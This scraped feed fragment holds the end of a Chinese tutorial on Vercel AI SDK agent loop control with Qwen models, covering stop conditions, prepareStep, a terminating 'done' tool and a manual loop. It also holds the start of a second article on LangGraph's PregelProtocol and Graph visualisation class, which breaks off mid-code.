<li><strong><code>stopWhen</code></strong>: 决定何时终止执行。</li>
<li><strong><code>prepareStep</code></strong>: 在每一步执行<strong>前</strong>，动态修改运行设置（如切换模型、控制工具白名单、精简上下文等）。</li>
</ul>
<hr/>
<h2 data-id="heading-2">二、 停止条件 (Stop Conditions)</h2>
<p><code>stopWhen</code> 参数控制 Agent 在拿到工具执行结果后是否继续下一步。默认情况下，Agent 最多执行 20 步（即内置的 <code>stepCountIs(20)</code>）。</p>
<h3 data-id="heading-3">1. 组合内置条件</h3>
<p>AI SDK 提供了现成的停止条件，你可以将它们组合在数组中，<strong>满足其一即停止</strong>：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, stepCountIs, hasToolCall } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-comment">// 引入上面配置的 qwen</span>
<span class="hljs-comment">// import { qwen } from './qwen-setup'; </span>

<span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 你的工具集，例如 search 等</span>
  },
  <span class="hljs-attr">stopWhen</span>: [
    <span class="hljs-title function_">stepCountIs</span>(<span class="hljs-number">20</span>),          <span class="hljs-comment">// 兜底策略：最多执行 20 步，防止死循环</span>
    <span class="hljs-title function_">hasToolCall</span>(<span class="hljs-string">'someTool'</span>),  <span class="hljs-comment">// 业务逻辑：一旦调用了 'someTool' 工具就立刻停止</span>
  ],
});

<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> agent.<span class="hljs-title function_">generate</span>({
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">'请调研并分析 2026 年前端开发趋势'</span>,
});
</code></pre>
<h3 data-id="heading-4">2. 编写自定义条件 (Custom Conditions)</h3>
<p>面对复杂的业务场景，你可以获取到历史所有步骤 <code>steps</code>，编写自定义的停止逻辑。例如，根据消耗的 Token 成本来“熔断” Agent：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, <span class="hljs-title class_">StopCondition</span>, <span class="hljs-title class_">ToolSet</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;

<span class="hljs-keyword">const</span> tools = { <span class="hljs-comment">/* ... */</span> } satisfies <span class="hljs-title class_">ToolSet</span>;

<span class="hljs-comment">// 自定义条件：当 Token 估算成本超过 $0.50 时强制停止</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">budgetExceeded</span>: <span class="hljs-title class_">StopCondition</span>&lt;<span class="hljs-keyword">typeof</span> tools&gt; = <span class="hljs-function">(<span class="hljs-params">{ steps }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> totalUsage = steps.<span class="hljs-title function_">reduce</span>(
    <span class="hljs-function">(<span class="hljs-params">acc, step</span>) =&gt;</span> ({
      <span class="hljs-attr">inputTokens</span>: acc.<span class="hljs-property">inputTokens</span> + (step.<span class="hljs-property">usage</span>?.<span class="hljs-property">inputTokens</span> ?? <span class="hljs-number">0</span>),
      <span class="hljs-attr">outputTokens</span>: acc.<span class="hljs-property">outputTokens</span> + (step.<span class="hljs-property">usage</span>?.<span class="hljs-property">outputTokens</span> ?? <span class="hljs-number">0</span>),
    }),
    { <span class="hljs-attr">inputTokens</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">outputTokens</span>: <span class="hljs-number">0</span> },
  );
  
  <span class="hljs-comment">// 按照自定义汇率或 token 价格估算</span>
  <span class="hljs-keyword">const</span> costEstimate = (totalUsage.<span class="hljs-property">inputTokens</span> * <span class="hljs-number">0.01</span> + totalUsage.<span class="hljs-property">outputTokens</span> * <span class="hljs-number">0.03</span>) / <span class="hljs-number">1000</span>;
  <span class="hljs-keyword">return</span> costEstimate &gt; <span class="hljs-number">0.5</span>; 
};

<span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  tools,
  <span class="hljs-attr">stopWhen</span>: budgetExceeded, 
});
</code></pre>
<hr/>
<h2 data-id="heading-5">三、 动态准备步骤 (Prepare Step) 神器</h2>
<p><code>prepareStep</code> 回调会在循环的<strong>每一步正式发起大模型请求之前</strong>运行。利用它，你可以实现高度智能的动态行为。</p>
<h3 data-id="heading-6">1. 动态模型切换 (Dynamic Model Selection)</h3>
<p>前几步简单的资料检索我们可以用轻量级模型省钱提速，后面复杂的逻辑推理再无缝切换到 <code>qwen-max</code>：</p>
<p>TypeScript</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> ToolLoopAgent({
  model: qwen(<span class="hljs-string">'qwen-turbo'</span>), <span class="hljs-comment">// 初始默认使用较快/较便宜的模型</span>
  tools: { <span class="hljs-comment">/* ... */</span> },
  prepareStep: <span class="hljs-keyword">async</span> ({ stepNumber, messages }) =&gt; {
    <span class="hljs-comment">// 如果循环超过 2 步，且上下文消息变长，说明任务变得复杂</span>
    <span class="hljs-comment">// 动态返回新的配置，无缝切换到最强的 qwen-max 模型</span>
    <span class="hljs-keyword">if</span> (stepNumber &gt; <span class="hljs-number">2</span> &amp;&amp; messages.length &gt; <span class="hljs-number">10</span>) {
      <span class="hljs-keyword">return</span> {
        model: qwen(<span class="hljs-string">'qwen-max'</span>),
      };
    }
    <span class="hljs-comment">// 返回空对象则继续使用当前配置</span>
    <span class="hljs-keyword">return</span> {};
  },
});
</code></pre>
<h3 data-id="heading-7">2. 阶段性工具分配 (Tool Selection)</h3>
<p>在复杂 SOP（标准作业程序）中，我们可以控制 Agent 在不同阶段能使用的工具：</p>
<p>TypeScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  prepareStep: async ({ stepNumber }) =&gt; {
    <span class="hljs-comment">// 第一阶段：检索资料 (第 0-2 步)</span>
    <span class="hljs-keyword">if</span> (stepNumber &lt;= <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">return</span> {
        activeTools: [<span class="hljs-string">'search'</span>],    <span class="hljs-comment">// 只开放搜索工具</span>
        toolChoice: <span class="hljs-string">'required'</span>,     <span class="hljs-comment">// 强制要求大模型必须调用工具</span>
      };
    }
    
    <span class="hljs-comment">// 第二阶段：数据分析 (第 3-5 步)</span>
    <span class="hljs-keyword">if</span> (stepNumber &lt;= <span class="hljs-number">5</span>) {
      <span class="hljs-keyword">return</span> { activeTools: [<span class="hljs-string">'analyze'</span>] };
    }
    
    <span class="hljs-comment">// 第三阶段：总结汇报 (第 6 步以上)</span>
    <span class="hljs-keyword">return</span> {
      activeTools: [<span class="hljs-string">'summarize'</span>],
      toolChoice: { type: <span class="hljs-string">'tool'</span>, toolName: <span class="hljs-string">'summarize'</span> }, <span class="hljs-comment">// 强制大模型调用特定的总结工具</span>
    };
  }
</code></pre>
<h3 data-id="heading-8">3. 防止上下文撑爆 (Context Management)</h3>
<p>长时间运行的 Agent 容易超出模型支持的最大 Token 长度。我们可以在这里动态裁剪传递给大模型的消息：</p>
<p>TypeScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  prepareStep: async ({ messages }) =&gt; {
    <span class="hljs-comment">// 如果对话超过 20 条，进行滑动窗口裁剪</span>
    <span class="hljs-keyword">if</span> (messages.length &gt; <span class="hljs-number">20</span>) {
      <span class="hljs-keyword">return</span> {
        messages: [
          messages[<span class="hljs-number">0</span>], <span class="hljs-comment">// 永远保留第一条 System Prompt/User Instruction</span>
          ...messages.slice(-<span class="hljs-number">10</span>), <span class="hljs-comment">// 只保留最近的 10 条交互记录</span>
        ],
      };
    }
    <span class="hljs-keyword">return</span> {};
  }
</code></pre>
<hr/>
<h2 data-id="heading-9">四、 强制工具调用 (Forced Tool Calling) 模式</h2>
<p>很多时候，我们不希望 Agent 用自然语言“水字数”，而是<strong>必须</strong>通过工具输出标准化的 JSON 结构结果。</p>
<p><strong>解法：</strong> 结合 <code>toolChoice: 'required'</code>，并设计一个<strong>不包含</strong> <code>execute</code> 函数的 <code>done</code> 虚拟工具。</p>
<blockquote>
<p>💡 <strong>原理：</strong> 因为模型被强制要求调用工具，而当它调用了没有执行函数的 <code>done</code> 工具时，AI SDK 内部因为无代码可执行，会触发“循环中断”条件，从而完美终止 Agent，并将结构化参数原封不动地返回给你！</p>
</blockquote>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { ToolLoopAgent, tool } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">agent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  model: <span class="hljs-title function_ invoke__">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  tools: {
    search: searchTool,
    analyze: analyzeTool,
    done: <span class="hljs-title function_ invoke__">tool</span>({
      <span class="hljs-attr">description</span>: <span class="hljs-string">'当你完成所有工作后，调用此工具输出最终结果'</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-keyword">object</span>({
        <span class="hljs-attr">answer</span>: z.<span class="hljs-keyword">string</span>().<span class="hljs-title function_ invoke__">describe</span>(<span class="hljs-string">'最终的分析报告'</span>),
        confidence: z.<span class="hljs-title function_ invoke__">number</span>().<span class="hljs-title function_ invoke__">describe</span>(<span class="hljs-string">'可信度评分 0-1'</span>),
      }),
      <span class="hljs-comment">// 注意核心技巧：这里绝对不写 execute 函数！</span>
    }),
  },
  toolChoice: <span class="hljs-string">'required'</span>, <span class="hljs-comment">// 强制每一步都不能输出废话，必须用工具</span>
});

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">result</span> = await agent.<span class="hljs-title function_ invoke__">generate</span>({
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">'请综合分析这份数据，并在完成后使用 done 工具提交最终报告。'</span>,
});

<span class="hljs-comment">// 从 staticToolCalls (未被执行的工具调用列表) 中提取出最终答案</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">finalToolCall</span> = result.staticToolCalls[<span class="hljs-number">0</span>]; 
<span class="hljs-keyword">if</span> (finalToolCall?.toolName === <span class="hljs-string">'done'</span>) {
  console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">"最终报告:"</span>, finalToolCall.input.answer);
  console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">"可信度:"</span>, finalToolCall.input.confidence);
}
</code></pre>
<hr/>
<h2 data-id="heading-10">五、 手动循环控制 (Manual Loop Control)</h2>
<p>如果你发现 <code>ToolLoopAgent</code> 的声明式 API 依然无法满足极为复杂的定制需求，你可以退回到 AI SDK 的底层，使用 <code>generateText</code> 手动写一个 <code>while</code> 循环。这为你提供了 100% 的底层控制流掌控力：</p>
<p>TypeScript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> { generateText, ModelMessage } from <span class="hljs-string">'ai'</span>;

<span class="hljs-type">const</span> messages: ModelMessage[] = [{ role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'分析并解决这个系统 Bug...'</span> }];
let step = <span class="hljs-number">0</span>;
<span class="hljs-type">const</span> maxSteps = <span class="hljs-number">10</span>;

<span class="hljs-keyword">while</span> (step &lt; maxSteps) {
  <span class="hljs-type">const</span> result = await <span class="hljs-built_in">generateText</span>({
    model: <span class="hljs-built_in">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
    messages,
    tools: {
      <span class="hljs-comment">// 在这里挂载你的工具</span>
    },
  });

  <span class="hljs-comment">// 将当前这一步的交互结果（包含 assistant 回复、工具调用结果等）追加到上下文池</span>
  messages.<span class="hljs-built_in">push</span>(...result.response.messages);

  <span class="hljs-comment">// 如果模型直接生成了最终结论文本（并没有继续调用工具），则认为整个思考链条已闭环</span>
  <span class="hljs-keyword">if</span> (result.text) {
    <span class="hljs-keyword">break</span>; 
  }

  step++;
}

console.<span class="hljs-built_in">log</span>(<span class="hljs-string">"任务完成，最终输出:"</span>, messages[messages.length - <span class="hljs-number">1</span>].content);
</code></pre>
<hr/>
<h2 data-id="heading-11">结语</h2>
<p>Vercel AI SDK 的 Loop Control 为构建复杂的 Agent 赋予了极大的灵活性和工程化能力：</p>
<ol>
<li><strong><code>stopWhen</code></strong> 让你可以精准定义退出条件，避免死循环和天价 API 账单。</li>
<li><strong><code>prepareStep</code></strong> 是实现 Agent “动态进化”的关键，可按需切换模型配置和分配工具白名单。</li>
<li>创新的<strong>虚拟 <code>done</code> 工具模式</strong>，是确保业务系统获得结构化数据的绝佳实践。</li>
</ol>
<p>搭配国内顶尖的<strong>通义千问 <code>qwen-max</code></strong> 模型强大的指令遵循能力，无论在落地效果还是接口兼容性上，都能为开发者提供丝滑的体验！</p>
<p>如果在开发 Agent 的路上对本文有所启发，欢迎<strong>点赞、收藏</strong>并在评论区交流你的最佳实践！👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[拆解LangChain执行引擎] PregelProtocol——定义了"LangChain执行体"最小功能集]]></title>    <link>https://juejin.cn/post/7605552034570879022</link>    <guid>https://juejin.cn/post/7605552034570879022</guid>    <pubDate>2026-02-12T23:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605552034570879022" data-draft-id="7605811866908082185" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" [拆解LangChain执行引擎] PregelProtocol——定义了&quot;LangChain执行体&quot;最小功能集"/> <meta itemprop="keywords" content="LangChain,Python"/> <meta itemprop="datePublished" content="2026-02-12T23:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JaydenAI"/> <meta itemprop="url" content="https://juejin.cn/user/3001011641261209"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             [拆解LangChain执行引擎] PregelProtocol——定义了"LangChain执行体"最小功能集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3001011641261209/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JaydenAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:40:18.000Z" title="Thu Feb 12 2026 23:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Pregel是对<code>PregelProtocol</code>协议的实现，后者的引入标志着 LangGraph 从一个单一的库进化为了一个可插拔的图计算框架。图可以视为“LangGraph 执行体”，而PregelProtocol定义了它必须具备的最小功能集合。我们从这协议的成员定义来看看这个功能集合包含哪些操作。</p>
<h2 data-id="heading-0">1. 配置绑定</h2>
<p>通过前面的内容我们会发现<code>RunnableConfig</code>这个对象几乎时无所不在，我们在调用Pregel对象的时候可以将它作为参数，用来提供用于控制其执行行为（比如迭代限制，并发控制等）的配置。执行引擎还将它作为容器用来下流流程传递一些组件和信号，所以前面的演示实例才可以在Node处理函数中从注入的RunnableConfig中提取像<code>Runtime</code>、<code>PregelScratchpad</code>、<code>Checkpoint命名空间</code>和<code>静态上下文</code>这样对象和信息。对于单纯Pregel的Node（不包括StateGraph的Node），RunnableConfig使唯一可以注入到处理函数中的参数，所以除了输入参数，其他所需的信息只能从它里面提取。</p>
<p><code>with_config</code>方法赋予了这个 “执行体”与配置绑定的能力。除了提供RunnableConfig对象，我们还可以利用关键词参数提供待绑定的配置。由于RunnableConfig本质上就是一个TypedDict对象，提供的关键字参数组成的键值对可以直接转换成RunnableConfig对象。with_config方法会将两者合并，生成一个新的RunnableConfig对象绑定到执行体上。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">with_config</span>(<span class="hljs-params">
        self, config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, **kwargs: <span class="hljs-type">Any</span>
    </span>) -&gt; Self: ...
</code></pre>
<h2 data-id="heading-1">2. 可视化呈现</h2>
<p>PregelProtocol是LangGraph对 “图” 的抽象，这里的图是 “图论” 的概念，但是若真能将它的结构呈现在一张 “图片” 中，这无疑是非常有意义的。毕竟代码仅仅是面向程序员的语言，比不上图片，不但直观，还没有受众限制。LangGraph专门定义了如下这个Graph类型来表示面向 “可视化呈现” 的图。</p>
<p>一个Graph对象标识的图依然由Node和Edge构成。它的每个Node都有一个唯一标识，我们可以调用<code>next_id</code>方法为下一个待添加的Node生成此标识。我们不仅可以调用<code>add_node</code>、<code>remove_node</code>和<code>add_edge</code>这样的方法以添加/移除Node和Edge来构建图，还可以调用<code>extend</code>方法将另一个Graph的所有Node和Edge添加进来。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Graph</span>:
    nodes: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, Node] = field(default_factory=<span class="hljs-built_in">dict</span>)
    edges: <span class="hljs-built_in">list</span>[Edge] = field(default_factory=<span class="hljs-built_in">list</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next_id</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_node</span>(<span class="hljs-params">
        self,
        data: <span class="hljs-built_in">type</span>[BaseModel] | RunnableType | <span class="hljs-literal">None</span>,
        <span class="hljs-built_in">id</span>: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        metadata: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; Node
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_node</span>(<span class="hljs-params">self, node: Node</span>) -&gt; <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_edge</span>(<span class="hljs-params">
        self,
        source: Node,
        target: Node,
        data: Stringifiable | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        conditional: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,  <span class="hljs-comment"># noqa: FBT001,FBT002</span>
    </span>) -&gt; Edge
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">
        self, graph: Graph, *, prefix: <span class="hljs-built_in">str</span> = <span class="hljs-string">""</span>
    </span>) -&gt; <span class="hljs-built_in">tuple</span>[Node | <span class="hljs-literal">None</span>, Node | <span class="hljs-literal">None</span>]:

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reid</span>(<span class="hljs-params">self</span>) -&gt; Graph:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">first_node</span>(<span class="hljs-params">self</span>) -&gt; Node | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">last_node</span>(<span class="hljs-params">self</span>) -&gt; Node | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_first_node</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_last_node</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_json</span>(<span class="hljs-params">self, *, with_schemas: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]]
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_ascii</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_ascii</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
<span class="hljs-meta">    @overload</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-built_in">str</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>: ...
<span class="hljs-meta">    @overload</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-literal">None</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span>: ...
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_png</span>(<span class="hljs-params">
        self,
        output_file_path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        fontname: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        labels: LabelsDict | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span> | <span class="hljs-literal">None</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_mermaid</span>(<span class="hljs-params">
        self,
        *,
        with_styles: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        wrap_label_n_words: <span class="hljs-built_in">int</span> = <span class="hljs-number">9</span>,
        frontmatter_config: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">str</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_mermaid_png</span>(<span class="hljs-params">
        self,
        *,
        curve_style: CurveStyle = CurveStyle.LINEAR,
        node_colors: NodeStyles | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        wrap_label_n_words: <span class="hljs-built_in">int</span> = <span class="hljs-number">9</span>,
        output_file_path: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        draw_method: MermaidDrawMethod = MermaidDrawMethod.API,
        background_color: <span class="hljs-built_in">str</span> = <span class="hljs-string">"white"</span>,
        padding: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span>,
        max_retries: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>,
        retry_delay: <span class="hljs-built_in">float</span> = <span class="hljs-number">1.0</span>,
        frontmatter_config: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
